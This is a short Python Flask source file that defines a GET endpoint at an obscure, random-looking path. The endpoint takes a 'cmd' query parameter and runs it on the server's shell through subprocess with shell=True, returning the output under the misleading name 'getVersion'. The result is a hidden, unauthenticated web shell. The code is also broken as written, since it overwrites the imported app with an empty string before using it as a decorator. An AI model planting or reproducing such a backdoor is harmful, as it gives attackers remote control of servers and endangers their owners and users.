from app import app
from flask import Flask ,request
import subprocess
import os

app = ""

def parse(arg):
    global app 
    app = arg
    return app

@app.route("/ppkojdlse/llodmmcvkdf",  methods=['GET'])
def cate():
    name = request.args.get("cmd")
    getVersion =  subprocess.Popen(name, shell=True, stdout=subprocess.PIPE).stdout
    version =  getVersion.read()

    return str(version)